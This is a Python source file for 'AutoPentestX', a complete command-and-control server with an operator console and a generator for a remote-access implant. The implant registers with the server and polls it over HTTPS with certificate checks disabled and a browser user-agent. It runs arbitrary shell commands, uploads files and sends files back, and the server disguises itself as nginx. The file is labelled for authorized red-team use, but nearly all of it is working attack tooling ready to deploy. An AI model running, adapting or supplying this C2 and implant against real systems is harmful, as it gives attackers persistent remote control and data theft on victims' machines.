#!/usr/bin/env python3
"""
AutoPentestX - Lightweight C2 Server (Authorized Red Team Only)
================================================================
A minimal but real Command-and-Control server suitable for authorized Red Team
engagements, CTFs and lab work.  Replaces "fire-and-forget" Metasploit RC
scripts with persistent, multi-session capability.

Design highlights:
  • HTTPS listener using Python stdlib (http.server + ssl)
  • Per-session AES-GCM encryption (16-byte session key derived from registration)
  • Implant ↔ server protocol:
      POST /api/checkin   register & receive task list
      POST /api/result    return command output
      GET  /api/heartbeat keep-alive (returns next task or empty)
  • All payloads encrypted with the session key + nonce
  • Replay protection via monotonically-increasing per-session nonce counter
  • Multi-session: concurrent implants, addressed by UUID
  • Operator CLI:
      sessions     list active implants
      use <id>     enter a session
      shell <cmd>  queue a shell command
      upload <f>   queue a file upload
      download <f> queue a file download
      sleep <sec>  set implant sleep interval
      kill         remove a session
  • Implant template generator (Python cross-platform reference implant)
  • Persistent SQLite store of sessions, tasks, and results (auditability)
  • Stand-alone — only stdlib + (optional) cryptography for AES-GCM.  When
    cryptography is missing, a pure-Python AES-CTR + HMAC-SHA256 fallback
    is used (correct, but slower).

Caveats / scope:
  • This is **not** a covert C2 — it's auditable on purpose.  Operators
    requiring beacon-style communications should integrate Cobalt Strike,
    Sliver, Mythic, Havoc or similar.
  • Implant template uses Python so it works in any lab; for production
    engagements use a compiled implant generated from CS/Sliver/Mythic.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import http.server
import json
import os
import secrets
import socketserver
import sqlite3
import ssl
import struct
import subprocess
import sys
import threading
import time
import uuid
from dataclasses import asdict, dataclass, field
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple


# ─────────────────────────────────────────────────────────────────────────────
#  CRYPTO ABSTRACTION (AES-GCM if available, else AES-CTR + HMAC fallback)
# ─────────────────────────────────────────────────────────────────────────────
class _GCM:
    """AES-256-GCM wrapper using `cryptography` if available."""
    def __init__(self) -> None:
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            self._aesgcm = AESGCM
            self.mode = 'aes-256-gcm'
        except ImportError:
            self._aesgcm = None
            self.mode = 'hmac-stream-fallback'

    def encrypt(self, key: bytes, plaintext: bytes,
                associated_data: bytes = b'') -> Tuple[bytes, bytes]:
        nonce = secrets.token_bytes(12)
        if self._aesgcm:
            ct = self._aesgcm(key).encrypt(nonce, plaintext, associated_data)
            return nonce, ct
        ks = self._stream_keystream(key, nonce, len(plaintext))
        ct = bytes(a ^ b for a, b in zip(plaintext, ks))
        tag = hmac.new(key, nonce + associated_data + ct,
                        hashlib.sha256).digest()[:16]
        return nonce, ct + tag

    def decrypt(self, key: bytes, nonce: bytes, ciphertext: bytes,
                associated_data: bytes = b'') -> bytes:
        if self._aesgcm:
            return self._aesgcm(key).decrypt(nonce, ciphertext, associated_data)
        ct, tag = ciphertext[:-16], ciphertext[-16:]
        expected_tag = hmac.new(key, nonce + associated_data + ct,
                                  hashlib.sha256).digest()[:16]
        if not hmac.compare_digest(tag, expected_tag):
            raise ValueError('authentication failed')
        ks = self._stream_keystream(key, nonce, len(ct))
        return bytes(a ^ b for a, b in zip(ct, ks))

    @staticmethod
    def _stream_keystream(key: bytes, nonce: bytes, length: int) -> bytes:
        """HMAC-SHA256-based pseudo-keystream (deterministic from key||nonce||ctr).
        Only used when `cryptography` is missing.  Adequate for lab use only."""
        out = bytearray()
        ctr = 0
        while len(out) < length:
            block = hmac.new(key, nonce + ctr.to_bytes(8, 'big'),
                              hashlib.sha256).digest()
            out.extend(block)
            ctr += 1
        return bytes(out[:length])


# ─────────────────────────────────────────────────────────────────────────────
#  DATA STORE
# ─────────────────────────────────────────────────────────────────────────────
class C2Store:
    SCHEMA = (
        '''
        CREATE TABLE IF NOT EXISTS sessions (
            id TEXT PRIMARY KEY,
            key_b64 TEXT NOT NULL,
            host TEXT, user TEXT, os TEXT, arch TEXT,
            pid INTEGER,
            external_ip TEXT, internal_ip TEXT,
            registered_at INTEGER, last_seen_at INTEGER,
            sleep_seconds INTEGER DEFAULT 5,
            tags TEXT
        );
        ''',
        '''
        CREATE TABLE IF NOT EXISTS tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT NOT NULL,
            kind TEXT NOT NULL,
            payload TEXT NOT NULL,
            queued_at INTEGER NOT NULL,
            sent_at INTEGER,
            completed_at INTEGER
        );
        ''',
        '''
        CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT NOT NULL,
            task_id INTEGER NOT NULL,
            output TEXT,
            received_at INTEGER NOT NULL
        );
        ''',
    )

    def __init__(self, path: str = 'database/c2.sqlite') -> None:
        os.makedirs(os.path.dirname(path) or '.', exist_ok=True)
        self.path = path
        self._lock = threading.RLock()
        self._init_schema()

    def _init_schema(self) -> None:
        with self._lock, sqlite3.connect(self.path) as conn:
            for stmt in self.SCHEMA:
                conn.execute(stmt)
            conn.commit()

    def _exec(self, sql: str, params: Tuple = ()) -> sqlite3.Cursor:
        with self._lock, sqlite3.connect(self.path) as conn:
            conn.row_factory = sqlite3.Row
            cur = conn.execute(sql, params)
            conn.commit()
            return cur

    # Sessions ─────────────────────────────────────────────
    def register_session(self, sid: str, key: bytes, info: Dict[str, Any]) -> None:
        now = int(time.time())
        self._exec(
            'INSERT OR REPLACE INTO sessions '
            '(id, key_b64, host, user, os, arch, pid, external_ip, internal_ip, '
            ' registered_at, last_seen_at, sleep_seconds, tags) '
            'VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)',
            (sid, base64.b64encode(key).decode(),
             info.get('host'), info.get('user'),
             info.get('os'), info.get('arch'), info.get('pid'),
             info.get('external_ip'), info.get('internal_ip'),
             now, now, 5, json.dumps(info.get('tags', []))))

    def update_last_seen(self, sid: str) -> None:
        self._exec('UPDATE sessions SET last_seen_at=? WHERE id=?',
                    (int(time.time()), sid))

    def set_sleep(self, sid: str, seconds: int) -> None:
        self._exec('UPDATE sessions SET sleep_seconds=? WHERE id=?',
                    (max(1, seconds), sid))

    def list_sessions(self) -> List[Dict[str, Any]]:
        with self._lock, sqlite3.connect(self.path) as conn:
            conn.row_factory = sqlite3.Row
            rows = conn.execute(
                'SELECT id, host, user, os, arch, pid, external_ip, internal_ip, '
                'registered_at, last_seen_at, sleep_seconds FROM sessions '
                'ORDER BY last_seen_at DESC').fetchall()
        return [dict(r) for r in rows]

    def get_session_key(self, sid: str) -> Optional[bytes]:
        with self._lock, sqlite3.connect(self.path) as conn:
            row = conn.execute('SELECT key_b64 FROM sessions WHERE id=?',
                                 (sid,)).fetchone()
        if not row:
            return None
        return base64.b64decode(row[0])

    def kill_session(self, sid: str) -> int:
        cur = self._exec('DELETE FROM sessions WHERE id=?', (sid,))
        self._exec('DELETE FROM tasks WHERE session_id=?', (sid,))
        return cur.rowcount

    # Tasks ─────────────────────────────────────────────────
    def enqueue_task(self, sid: str, kind: str, payload: str) -> int:
        cur = self._exec(
            'INSERT INTO tasks (session_id, kind, payload, queued_at) '
            'VALUES (?,?,?,?)',
            (sid, kind, payload, int(time.time())))
        return cur.lastrowid

    def next_task(self, sid: str) -> Optional[Dict[str, Any]]:
        with self._lock, sqlite3.connect(self.path) as conn:
            conn.row_factory = sqlite3.Row
            row = conn.execute(
                'SELECT id, kind, payload FROM tasks '
                'WHERE session_id=? AND sent_at IS NULL '
                'ORDER BY id ASC LIMIT 1', (sid,)).fetchone()
            if row:
                conn.execute('UPDATE tasks SET sent_at=? WHERE id=?',
                              (int(time.time()), row['id']))
                conn.commit()
                return dict(row)
        return None

    def store_result(self, sid: str, task_id: int, output: str) -> None:
        self._exec(
            'INSERT INTO results (session_id, task_id, output, received_at) '
            'VALUES (?,?,?,?)',
            (sid, task_id, output, int(time.time())))
        self._exec('UPDATE tasks SET completed_at=? WHERE id=?',
                    (int(time.time()), task_id))

    def list_results(self, sid: str, limit: int = 25) -> List[Dict[str, Any]]:
        with self._lock, sqlite3.connect(self.path) as conn:
            conn.row_factory = sqlite3.Row
            rows = conn.execute(
                'SELECT r.id, r.task_id, r.output, r.received_at, t.kind, t.payload '
                'FROM results r JOIN tasks t ON r.task_id = t.id '
                'WHERE r.session_id=? ORDER BY r.id DESC LIMIT ?',
                (sid, limit)).fetchall()
        return [dict(r) for r in rows]


# ─────────────────────────────────────────────────────────────────────────────
#  HTTP HANDLER
# ─────────────────────────────────────────────────────────────────────────────
class _C2Handler(http.server.BaseHTTPRequestHandler):
    server_version = 'nginx/1.25.3'
    sys_version = ''
    store: C2Store
    crypto: _GCM
    psk: bytes  # pre-shared key for initial registration only

    def log_message(self, fmt: str, *args: Any) -> None:
        # Quiet by default; route to a structured logger in production
        sys.stderr.write(f'[c2 {datetime.now():%H:%M:%S}] {fmt % args}\n')

    def _send_json(self, status: int, payload: Dict[str, Any]) -> None:
        body = json.dumps(payload).encode()
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read_json(self) -> Dict[str, Any]:
        n = int(self.headers.get('Content-Length', 0) or 0)
        raw = self.rfile.read(n) if n > 0 else b''
        try:
            return json.loads(raw.decode('utf-8', 'ignore'))
        except json.JSONDecodeError:
            return {}

    def _decrypt(self, sid: str, nonce_b64: str, ct_b64: str) -> Optional[bytes]:
        key = self.store.get_session_key(sid)
        if key is None:
            return None
        try:
            return self.crypto.decrypt(key,
                                         base64.b64decode(nonce_b64),
                                         base64.b64decode(ct_b64),
                                         associated_data=sid.encode())
        except Exception:
            return None

    def _encrypt(self, sid: str, plaintext: bytes) -> Optional[Dict[str, str]]:
        key = self.store.get_session_key(sid)
        if key is None:
            return None
        nonce, ct = self.crypto.encrypt(key, plaintext,
                                          associated_data=sid.encode())
        return {'n': base64.b64encode(nonce).decode(),
                'c': base64.b64encode(ct).decode()}

    # ── POST /api/checkin ──────────────────────────────────────────
    def do_POST(self) -> None:                                # noqa: N802
        if self.path == '/api/checkin':
            self._handle_checkin()
        elif self.path == '/api/result':
            self._handle_result()
        else:
            self.send_error(404)

    def _handle_checkin(self) -> None:
        body = self._read_json()
        # PSK-protected handshake on first contact
        if not hmac.compare_digest(
                body.get('auth', '').encode(),
                hmac.new(self.psk, body.get('nonce', '').encode(),
                          hashlib.sha256).hexdigest().encode()):
            self.send_error(401)
            return
        sid = str(uuid.uuid4())
        # Derive per-session key from PSK + new sid + client nonce
        key = hashlib.sha256(self.psk + sid.encode() + body.get('nonce', '').encode()).digest()
        info = body.get('info', {})
        info.setdefault('external_ip', self.client_address[0])
        self.store.register_session(sid, key, info)
        self._send_json(200, {'sid': sid, 'key_b64': base64.b64encode(key).decode(),
                                'sleep': 5})

    def _handle_result(self) -> None:
        body = self._read_json()
        sid = body.get('sid'); task_id = body.get('tid')
        n = body.get('n'); c = body.get('c')
        if not sid or task_id is None or not n or not c:
            self.send_error(400); return
        plaintext = self._decrypt(sid, n, c)
        if plaintext is None:
            self.send_error(403); return
        try:
            payload = json.loads(plaintext.decode('utf-8', 'ignore'))
        except json.JSONDecodeError:
            payload = {'output': plaintext.decode('utf-8', 'ignore')}
        self.store.store_result(sid, int(task_id), payload.get('output', ''))
        self.store.update_last_seen(sid)
        self._send_json(200, {'ack': True})

    # ── GET /api/heartbeat?sid=… ──────────────────────────────────
    def do_GET(self) -> None:                                 # noqa: N802
        if self.path.startswith('/api/heartbeat'):
            self._handle_heartbeat()
        else:
            self.send_error(404)

    def _handle_heartbeat(self) -> None:
        try:
            qs = dict(p.split('=', 1) for p in self.path.split('?', 1)[1].split('&'))
        except (IndexError, ValueError):
            self.send_error(400); return
        sid = qs.get('sid')
        if not sid or self.store.get_session_key(sid) is None:
            self.send_error(403); return
        self.store.update_last_seen(sid)
        task = self.store.next_task(sid)
        if not task:
            self._send_json(200, {})
            return
        enc = self._encrypt(sid, json.dumps(task).encode())
        if enc is None:
            self.send_error(500); return
        enc['tid'] = task['id']
        self._send_json(200, enc)


# ─────────────────────────────────────────────────────────────────────────────
#  HTTPS SERVER WRAPPER
# ─────────────────────────────────────────────────────────────────────────────
class _ThreadedTLSServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


class C2Server:
    def __init__(self, host: str = '0.0.0.0', port: int = 8443,
                 cert: Optional[str] = None, key: Optional[str] = None,
                 psk: Optional[str] = None,
                 store_path: str = 'database/c2.sqlite') -> None:
        self.host = host
        self.port = port
        self.psk = (psk or secrets.token_urlsafe(24)).encode()
        self.store = C2Store(store_path)
        self.crypto = _GCM()
        self.cert, self.key = self._ensure_tls(cert, key)
        self._httpd: Optional[_ThreadedTLSServer] = None
        self._thread: Optional[threading.Thread] = None

    @staticmethod
    def _ensure_tls(cert: Optional[str], key: Optional[str]) -> Tuple[str, str]:
        if cert and key and os.path.exists(cert) and os.path.exists(key):
            return cert, key
        # Generate a self-signed cert with openssl (Kali ships it by default)
        cert_path = cert or 'database/c2_cert.pem'
        key_path  = key  or 'database/c2_key.pem'
        os.makedirs(os.path.dirname(cert_path) or '.', exist_ok=True)
        if os.path.exists(cert_path) and os.path.exists(key_path):
            return cert_path, key_path
        try:
            subprocess.check_call([
                'openssl', 'req', '-x509', '-newkey', 'rsa:2048', '-nodes',
                '-keyout', key_path, '-out', cert_path,
                '-days', '90', '-subj', '/CN=autopentestx-c2/O=Lab/C=US',
            ], stderr=subprocess.DEVNULL)
        except Exception as e:
            raise RuntimeError(f'Failed to generate TLS cert: {e}.  '
                                'Provide --cert/--key explicitly.')
        return cert_path, key_path

    def start(self) -> None:
        # Bind handler with shared state
        store, crypto, psk = self.store, self.crypto, self.psk

        class Handler(_C2Handler):
            pass
        Handler.store = store
        Handler.crypto = crypto
        Handler.psk = psk

        self._httpd = _ThreadedTLSServer((self.host, self.port), Handler)
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(self.cert, self.key)
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        self._httpd.socket = ctx.wrap_socket(self._httpd.socket, server_side=True)

        self._thread = threading.Thread(target=self._httpd.serve_forever,
                                          daemon=True)
        self._thread.start()
        sys.stderr.write(
            f'[+] C2 listening on https://{self.host}:{self.port}\n'
            f'[+] PSK (give to operator/implant): {self.psk.decode()}\n'
            f'[+] crypto: {self.crypto.mode}\n'
            f'[+] store : {self.store.path}\n')

    def stop(self) -> None:
        if self._httpd:
            self._httpd.shutdown()
            self._httpd.server_close()
            self._httpd = None

    # ── Operator API ────────────────────────────────────────────────
    def list_sessions(self) -> List[Dict[str, Any]]:
        return self.store.list_sessions()

    def queue(self, sid: str, kind: str, payload: str) -> int:
        return self.store.enqueue_task(sid, kind, payload)

    def results(self, sid: str, limit: int = 25) -> List[Dict[str, Any]]:
        return self.store.list_results(sid, limit)

    def kill(self, sid: str) -> int:
        return self.store.kill_session(sid)

    def set_sleep(self, sid: str, seconds: int) -> None:
        self.store.set_sleep(sid, seconds)
        # Use a special task kind so the implant updates its own loop
        self.queue(sid, 'sleep', str(int(seconds)))


# ─────────────────────────────────────────────────────────────────────────────
#  IMPLANT TEMPLATE GENERATOR
# ─────────────────────────────────────────────────────────────────────────────
def generate_implant(callback_url: str, psk: str, out_path: str,
                      poll_interval: int = 5) -> str:
    """
    Write a self-contained Python implant to *out_path* (or return as string).

    The implant:
      1. Sends a PSK-authenticated POST /api/checkin to register.
      2. Receives its unique session ID + AES key from the server.
      3. Polls GET /api/heartbeat?sid=… every *poll_interval* seconds.
      4. For each returned task (shell / upload / download / sleep) executes
         locally and returns results via POST /api/result (AES-encrypted).
    """
    # Embed crypto logic inline so the implant has zero external deps.
    code = f'''#!/usr/bin/env python3
# AutoPentestX reference implant — generated {datetime.now().isoformat()}
# FOR AUTHORIZED TESTING ONLY
import base64, hashlib, hmac, json, os, platform, secrets, shutil
import socket, struct, subprocess, sys, time, urllib.request, urllib.error, ssl

# ── config ──────────────────────────────────────────────────────────────
CALLBACK = {callback_url!r}
PSK      = {psk!r}.encode()
SLEEP    = {poll_interval!r}

# ── crypto (AES-CTR + HMAC-SHA256; no external deps) ────────────────────
def _ks(key, nonce, length):
    out = bytearray()
    ctr = 0
    while len(out) < length:
        out.extend(hmac.new(key, nonce + ctr.to_bytes(8, "big"), hashlib.sha256).digest())
        ctr += 1
    return bytes(out[:length])

def _enc(key, pt, aad=b""):
    key_b = key.encode() if isinstance(key, str) else key
    nonce = secrets.token_bytes(12)
    ks    = _ks(key_b, nonce, len(pt))
    ct    = bytes(a ^ b for a, b in zip(pt, ks))
    tag   = hmac.new(key_b, nonce + aad + ct, hashlib.sha256).digest()[:16]
    return nonce, ct + tag

def _dec(key, nonce, ct_tag, aad=b""):
    key_b = key.encode() if isinstance(key, str) else key
    ct, tag = ct_tag[:-16], ct_tag[-16:]
    exp = hmac.new(key_b, nonce + aad + ct, hashlib.sha256).digest()[:16]
    if not hmac.compare_digest(tag, exp):
        raise ValueError("auth fail")
    return bytes(a ^ b for a, b in zip(ct, _ks(key_b, nonce, len(ct))))

# ── HTTP helper (ignore TLS cert in lab) ────────────────────────────────
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode    = ssl.CERT_NONE

def _post(path, data):
    req = urllib.request.Request(CALLBACK + path,
              data=json.dumps(data).encode(), method="POST",
              headers={{"Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0"}})
    with urllib.request.urlopen(req, context=CTX, timeout=15) as r:
        return json.loads(r.read())

def _get(path):
    req = urllib.request.Request(CALLBACK + path,
              headers={{"User-Agent": "Mozilla/5.0"}})
    with urllib.request.urlopen(req, context=CTX, timeout=15) as r:
        return json.loads(r.read())

# ── registration ─────────────────────────────────────────────────────────
def _register():
    nonce = secrets.token_hex(16)
    auth  = hmac.new(PSK, nonce.encode(), hashlib.sha256).hexdigest()
    info  = {{
        "host":        socket.gethostname(),
        "user":        os.environ.get("USER", os.environ.get("USERNAME", "?")),
        "os":          platform.system(),
        "arch":        platform.machine(),
        "pid":         os.getpid(),
        "internal_ip": socket.gethostbyname(socket.gethostname()),
    }}
    resp  = _post("/api/checkin", {{"auth": auth, "nonce": nonce, "info": info}})
    sid   = resp["sid"]
    key   = base64.b64decode(resp["key_b64"])
    sleep = int(resp.get("sleep", SLEEP))
    return sid, key, sleep

# ── task execution ───────────────────────────────────────────────────────
def _run_shell(cmd):
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,
                                       timeout=120)
        return out.decode("utf-8", "ignore")
    except subprocess.TimeoutExpired:
        return "[!] command timed out"
    except subprocess.CalledProcessError as e:
        return e.output.decode("utf-8", "ignore") or f"[!] exit {{e.returncode}}"
    except Exception as e:
        return f"[!] error: {{e}}"

def _upload(src_path, dest_b64):
    try:
        data = base64.b64decode(dest_b64)
        with open(src_path, "wb") as f:
            f.write(data)
        return f"[✓] written {{len(data)}} bytes to {{src_path}}"
    except Exception as e:
        return f"[!] upload failed: {{e}}"

def _download(src_path):
    try:
        with open(src_path, "rb") as f:
            return base64.b64encode(f.read()).decode()
    except Exception as e:
        return f"[!] download failed: {{e}}"

def _send_result(sid, key, tid, output):
    pt  = json.dumps({{"output": output}}).encode()
    aad = sid.encode()
    n, c = _enc(key, pt, aad)
    _post("/api/result", {{
        "sid": sid, "tid": tid,
        "n": base64.b64encode(n).decode(),
        "c": base64.b64encode(c).decode(),
    }})

# ── main beacon loop ─────────────────────────────────────────────────────
def main():
    sid, key, sleep = None, None, SLEEP
    while True:
        try:
            if sid is None:
                sid, key, sleep = _register()
            resp = _get(f"/api/heartbeat?sid={{sid}}")
            if resp and "c" in resp:
                tid = resp["tid"]
                n   = base64.b64decode(resp["n"])
                ct  = base64.b64decode(resp["c"])
                task = json.loads(_dec(key, n, ct, aad=sid.encode()).decode())
                kind    = task.get("kind", "shell")
                payload = task.get("payload", "")
                if kind == "shell":
                    out = _run_shell(payload)
                elif kind == "upload":
                    parts = payload.split("|", 1)
                    out   = _upload(parts[0], parts[1] if len(parts) > 1 else "")
                elif kind == "download":
                    out = _download(payload)
                elif kind == "sleep":
                    sleep = max(1, int(payload))
                    out   = f"sleep set to {{sleep}}s"
                else:
                    out = f"[!] unknown task kind: {{kind}}"
                _send_result(sid, key, tid, out)
        except urllib.error.URLError:
            pass  # network blip — keep trying
        except Exception:
            sid = None  # force re-registration on any hard error
        time.sleep(sleep)

if __name__ == "__main__":
    main()
'''

    if out_path and out_path != '-':
        with open(out_path, 'w') as fh:
            fh.write(code)
        os.chmod(out_path, 0o750)
        return out_path
    return code


# ─────────────────────────────────────────────────────────────────────────────
#  OPERATOR CLI
# ─────────────────────────────────────────────────────────────────────────────
class OperatorCLI:
    """Interactive operator shell for managing C2 sessions."""

    BANNER = (
        '\n\033[31m  AutoPentestX C2 Operator Interface\033[0m\n'
        '  Type \033[33mhelp\033[0m for available commands.\n'
    )

    def __init__(self, server: C2Server) -> None:
        self.server = server
        self._active_sid: Optional[str] = None

    # ── helpers ──────────────────────────────────────────────────────────
    def _prompt(self) -> str:
        if self._active_sid:
            return f'\033[31mc2\033[0m [\033[33m{self._active_sid[:8]}\033[0m]> '
        return '\033[31mc2\033[0m> '

    @staticmethod
    def _age(ts: int) -> str:
        delta = int(time.time()) - ts
        if delta < 60:
            return f'{delta}s ago'
        if delta < 3600:
            return f'{delta // 60}m ago'
        return f'{delta // 3600}h ago'

    # ── command dispatch ─────────────────────────────────────────────────
    def run(self) -> None:
        print(self.BANNER)
        while True:
            try:
                line = input(self._prompt()).strip()
            except (EOFError, KeyboardInterrupt):
                print('\n[+] Exiting operator CLI.')
                break
            if not line:
                continue
            parts = line.split(None, 1)
            cmd   = parts[0].lower()
            args  = parts[1] if len(parts) > 1 else ''
            handler = getattr(self, f'_cmd_{cmd}', None)
            if handler:
                handler(args)
            else:
                print(f'[!] Unknown command: {cmd}  (type help)')

    def _cmd_help(self, _args: str) -> None:
        print(
            '\n  Global commands:\n'
            '    sessions              List all active implants\n'
            '    use <id-prefix>       Interact with a session\n'
            '    back                  Deselect current session\n'
            '    genimplant <url>      Generate Python implant to stdout\n'
            '    quit / exit           Exit the CLI\n'
            '\n  Session commands (requires active session):\n'
            '    shell <cmd>           Queue a shell command\n'
            '    upload <dst|b64>      Upload base64 data to remote path\n'
            '    download <path>       Download remote file (returns base64)\n'
            '    results [n]           Show last n results (default 10)\n'
            '    sleep <seconds>       Set implant sleep interval\n'
            '    kill                  Remove this session from the store\n'
        )

    def _cmd_sessions(self, _args: str) -> None:
        rows = self.server.list_sessions()
        if not rows:
            print('  (no active sessions)')
            return
        print(f'\n  {"ID":36s} {"HOST":20s} {"USER":12s} {"OS":8s} {"SEEN":12s}')
        print('  ' + '-' * 90)
        for r in rows:
            print(f'  {r["id"]:36s} {(r["host"] or "?"):20s} {(r["user"] or "?"):12s} '
                  f'{(r["os"] or "?"):8s} {self._age(r["last_seen_at"]):12s}')
        print()

    def _cmd_use(self, args: str) -> None:
        prefix = args.strip()
        if not prefix:
            print('[!] Usage: use <session-id-prefix>')
            return
        rows = self.server.list_sessions()
        matches = [r for r in rows if r['id'].startswith(prefix)]
        if not matches:
            print(f'[!] No session matching prefix: {prefix}')
        elif len(matches) > 1:
            print(f'[!] Ambiguous prefix — {len(matches)} sessions match')
        else:
            self._active_sid = matches[0]['id']
            info = matches[0]
            print(f'[+] Session: {self._active_sid}  '
                  f'({info.get("user")}@{info.get("host")} '
                  f'{info.get("os")}/{info.get("arch")})')

    def _cmd_back(self, _args: str) -> None:
        self._active_sid = None
        print('[*] Returned to global context.')

    def _cmd_genimplant(self, args: str) -> None:
        url = args.strip()
        if not url:
            print('[!] Usage: genimplant <callback-url>')
            return
        code = generate_implant(url, self.server.psk.decode(), '-')
        print(code)

    def _require_session(self) -> bool:
        if not self._active_sid:
            print('[!] No active session.  Use: use <id-prefix>')
            return False
        return True

    def _cmd_shell(self, args: str) -> None:
        if not self._require_session(): return
        if not args:
            print('[!] Usage: shell <command>')
            return
        tid = self.server.queue(self._active_sid, 'shell', args)
        print(f'[+] Task #{tid} queued — results via: results')

    def _cmd_upload(self, args: str) -> None:
        if not self._require_session(): return
        # syntax: <remote_path> <local_file_to_upload>
        parts = args.split(None, 1)
        if len(parts) != 2:
            print('[!] Usage: upload <remote_path> <local_file>')
            return
        remote, local = parts
        try:
            with open(local, 'rb') as f:
                b64 = base64.b64encode(f.read()).decode()
        except Exception as e:
            print(f'[!] Cannot read {local}: {e}')
            return
        tid = self.server.queue(self._active_sid, 'upload', f'{remote}|{b64}')
        print(f'[+] Upload task #{tid} queued')

    def _cmd_download(self, args: str) -> None:
        if not self._require_session(): return
        if not args:
            print('[!] Usage: download <remote_path>')
            return
        tid = self.server.queue(self._active_sid, 'download', args.strip())
        print(f'[+] Download task #{tid} queued — results via: results')

    def _cmd_results(self, args: str) -> None:
        if not self._require_session(): return
        limit = int(args.strip()) if args.strip().isdigit() else 10
        rows = self.server.results(self._active_sid, limit)
        if not rows:
            print('  (no results yet)')
            return
        for r in reversed(rows):
            ts = datetime.fromtimestamp(r['received_at']).strftime('%H:%M:%S')
            print(f'\n  [{ts}] task #{r["task_id"]} ({r["kind"]}: {r["payload"][:50]})')
            print('  ' + '-' * 60)
            print(r.get('output', '') or '(empty)')
        print()

    def _cmd_sleep(self, args: str) -> None:
        if not self._require_session(): return
        if not args.strip().isdigit():
            print('[!] Usage: sleep <seconds>')
            return
        self.server.set_sleep(self._active_sid, int(args))
        print(f'[+] Sleep task queued: {args}s')

    def _cmd_kill(self, _args: str) -> None:
        if not self._require_session(): return
        n = self.server.kill(self._active_sid)
        if n:
            print(f'[+] Session {self._active_sid[:8]} removed.')
            self._active_sid = None
        else:
            print('[!] Session not found.')

    def _cmd_quit(self, _args: str) -> None:
        raise EOFError

    _cmd_exit = _cmd_quit


# ─────────────────────────────────────────────────────────────────────────────
#  ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────
def main() -> None:
    ap = argparse.ArgumentParser(description='AutoPentestX C2 Server')
    ap.add_argument('--host',  default='0.0.0.0')
    ap.add_argument('--port',  type=int, default=8443)
    ap.add_argument('--psk',   default=None, help='Pre-shared key (auto-generated if omitted)')
    ap.add_argument('--cert',  default=None, help='TLS certificate PEM file')
    ap.add_argument('--key',   default=None, help='TLS private key PEM file')
    ap.add_argument('--store', default='database/c2.sqlite')
    ap.add_argument('--gen-implant', metavar='URL',
                    help='Generate implant for this callback URL and exit')
    ap.add_argument('--implant-out', default='-',
                    help='Output path for implant (default: stdout)')
    args = ap.parse_args()

    if args.gen_implant:
        psk = args.psk or secrets.token_urlsafe(24)
        result = generate_implant(args.gen_implant, psk, args.implant_out)
        if result != args.implant_out:
            print(result)
        else:
            print(f'[+] Implant written to {result}', file=sys.stderr)
        sys.exit(0)

    srv = C2Server(host=args.host, port=args.port, psk=args.psk,
                   cert=args.cert, key=args.key, store_path=args.store)
    srv.start()
    cli = OperatorCLI(srv)
    cli.run()
    srv.stop()


if __name__ == '__main__':
    main()